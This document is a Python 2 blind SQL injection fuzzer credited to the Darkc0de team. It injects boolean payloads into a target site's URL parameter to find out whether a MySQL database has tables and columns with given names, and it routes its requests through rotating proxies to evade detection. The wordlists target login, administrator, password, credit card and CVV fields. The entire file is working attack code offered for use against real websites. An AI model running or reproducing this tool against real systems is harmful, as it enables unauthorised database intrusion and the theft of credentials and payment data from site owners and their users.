#!/usr/bin/python
# MySQL Blind Table and Column Fuzzer
# This script will fuzz table and columns names
# via blind sql injection and put it in a nice reader friendly output

# String is the text in the page that comes back when 1=1
# same as in sqlmap.py

# Share the Knowledge!

# Darkc0de Team 
# www.darkc0de.com 
# rsauron[at]gmail[dot]com

# Greetz to 
# d3hydr8, P47r1ck, Tarsian, c0mr@d, reverenddigitalx, Baltazar
# and the rest of the Darkc0de members

#Fill in the tables you want tested here.
fuzz_tables = ["user","users","username","usernames","mysql.user","orders","member","members","admin","administrator","administrators","login","logins","logon","jos_users","jos_contact_details","userrights","superuser","control","usercontrol","author","autore","artikel","newsletter","tb_user","tb_users","tb_username","tb_usernames","tb_admin","tb_administrator","tb_member","tb_members","tb_login","perdorues","korisnici","webadmin","webadmins","webuser","webusers","webmaster","webmasters","customer","customers","sysuser","sysusers","sysadmin","sysadmins","memberlist","tbluser","tbl_user","tbl_users","a_admin","x_admin","m_admin","adminuser","admin_user","adm","userinfo","user_info","admin_userinfo","userlist","user_list","user_admin","order","user_login","admin_user","admin_login","login_user","login_users","login_admin","login_admins","sitelogin","site_login","sitelogins","site_logins","SiteLogin","Site_Login","User","Users","Admin","Admins","Login","Logins","adminrights","news","perdoruesit"] 
#Fill in the columns you want tested here.
fuzz_columns = ["user","username","password","passwd","pass","cc_number","id","email","emri","fjalekalimi","pwd","user_name","customers_email_address","customers_password","user_password","name","user_pass","admin_user","admin_password","user_pass","admin_pass","usern","user_n","users","login","logins","login_user","login_admin","login_username","user_username","user_login","auid","apwd","adminid","admin_id","adminuser","admin_user","adminuserid","admin_userid","adminusername","admin_username","adminname","admin_name","usr","usr_n","usrname","usr_name","usrpass","usr_pass","usrnam","nc","uid","userid","user_id","myusername","mail","emni","logohu","punonjes","kpro_user","wp_users","emniplote","perdoruesi","perdorimi","punetoret","logini","llogaria","fjalekalimin","kodi","emer","ime","korisnik","korisnici","user1","administrator","administrator_name","mem_login","login_password","login_pass","login_passwd","login_pwd","sifra","lozinka","psw","pass1word","pass_word","passw","pass_w","user_passwd","userpass","userpassword","userpwd","user_pwd","useradmin","user_admin","mypassword","passwrd","admin_pwd","admin_pass","admin_passwd","mem_password","memlogin","userid","admin_id","adminid","e_mail","usrn","u_name","uname","mempassword","mem_pass","mem_passwd","mem_pwd","p_word","pword","p_assword","myusername","myname","my_username","my_name","my_password","my_email","cvvnumber"] 
  
import urllib, sys, re, socket, httplib, urllib2

print "+--------------------------------------------------------+"
print "+ rsauron:darkc0de.com MySQL Blind Injection Fuzzer v1.0 +" 
print "+--------------------------------------------------------+"

#Validate input parameters
if len(sys.argv) < 2:
	print "\nUsage: ./blindfuzz.py -u <site> -s <string> -p <proxy/proxyfile> -o <output file>"
	print "\nEx: ./blindfuzz.py -u \"www.site.com/product_id?id=473\" -s \"textinpage\" -p 127.0.0.1:80\n -o fuzz.txt"
	sys.exit(1)

#define varablies
site = ""
string = ""
dbt = "fuzzdatabase.txt"
proxy = "None"
count = 0

#Check args
for arg in sys.argv:
    if arg == "-u":
        site = sys.argv[count+1]
    elif arg == "-s":
        string = sys.argv[count+1]
    elif arg == "-p":
	proxy = sys.argv[count+1]
    elif arg == "-o":
        dbt = sys.argv[count+1]
    count+=1

#Error Checking
if site == "":
    print "\n[-] Must include -u flag followed by site.\n" 
    sys.exit(1)
if string == "":
    print "\n[-] Must include -s flag followed by intext string.\n"
if proxy != "None":
    if len(proxy.split(".")) == 2:
	    proxy = open(proxy, "r").read()
    if proxy.endswith("\n"):
	    proxy = proxy.rstrip("\n")
    proxy = proxy.split("\n")
if site[:7] != "http://": 
	site = "http://"+site

#Title write
file = open(dbt, "a")
file.writelines("\n\n+--------------------------------------------------------+")
file.writelines("\n+ rsauron:darkc0de.com MySQL Blind Injection Fuzzer v1.0 +") 
file.writelines("\n+--------------------------------------------------------+")
print "[+] URL:",site
file.writelines("\n[+] URL:"+site+"\n")	

#Build proxy list
socket.setdefaulttimeout(10)
proxy_list = []
if proxy != "None":
    file.writelines("[+] Building Proxy List...")
    print "[+] Building Proxy List..."
    for p in proxy:
	try:
            proxy_handler = urllib2.ProxyHandler({'http': 'http://'+p+'/'})
            opener = urllib2.build_opener(proxy_handler)
	    opener.open("http://www.google.com")
	    proxy_list.append(urllib2.build_opener(proxy_handler))
	    file.writelines("\n\tProxy:"+p+"- Success")
	    print "\tProxy:",p,"- Success"
	except:
	    file.writelines("\n\tProxy:"+p+"- Failed")
	    print "\tProxy:",p,"- Failed"
	    pass
    if len(proxy_list) == 0:
	print "[-] All proxies have failed. App Exiting"
	file.writelines("\n[-] All proxies have failed. App Exiting\n")
	sys.exit(1) 
    print "[+] Proxy List Complete"
    file.writelines("[+] Proxy List Complete")
else:
    print "[-] Proxy Not Given"
    file.writelines("[+] Proxy Not Given")
    proxy_list.append(urllib2.build_opener())

#check version
head_URL = site+"+and+substring(@@version,1,1)=4"
print "[+] Gathering MySQL Server Configuration..."
file.writelines("\n[+] Gathering MySQL Server Configuration...")
proxy_num = 0
proxy_len = len(proxy_list)
while 1:
        try:
                source = proxy_list[proxy_num % proxy_len].open(head_URL).read()
                match = re.findall(string,source)
                if len(match) >= 1:
                        print "\t[+] MySQL v4 verified"
                        file.writelines("\n\t[+] MySQL v4 verified")
                        break
                else:
                        print "\t[+] MySQL v5 verified "
                        file.writelines("\n\t[+] MySQL v5 verified")
                        break
        except (KeyboardInterrupt, SystemExit):
        	raise
	except:
		proxy_num+=1

#Lets Fuzz
print "[+] Fuzzing Tables..."
file.writelines("\n[+] Fuzzing Tables...")
fuzz_TABLE_url = site+"+and+(SELECT+1+from+TABLE+limit+0,1)=1"
for table in fuzz_tables: 
	try:
		proxy_num+=1
		table_URL = fuzz_TABLE_url.replace("TABLE",table)
		source = proxy_list[proxy_num % proxy_len].open(table_URL).read()
		match = re.findall(string,source)
		if len(match) >= 1:
			print "\n[Table]:",table
			file.writelines("\n\n[Table]:"+table)
			fuzz_COLUMN_url = site+"+and+(SELECT+substring(concat(1,COLUMN),1,1)+from+"+table+"+limit+0,1)=1"
			for column in fuzz_columns:
				try:
					proxy_num+=1
					column_URL = fuzz_COLUMN_url.replace("COLUMN",column)
					source = proxy_list[proxy_num % proxy_len].open(column_URL).read()
					match = re.findall(string,source)
					if len(match) >= 1:
						print "[Column]:",column
						file.writelines("\n[Column]:"+column)	
				except (KeyboardInterrupt, SystemExit):
					raise
				except:
					pass	
	except (KeyboardInterrupt, SystemExit):
		raise
	except:
                pass
print "\n[-] Done"
file.writelines("\n\n[-] Done\n")
print "Don't forget to check", dbt,"\n"
file.close()
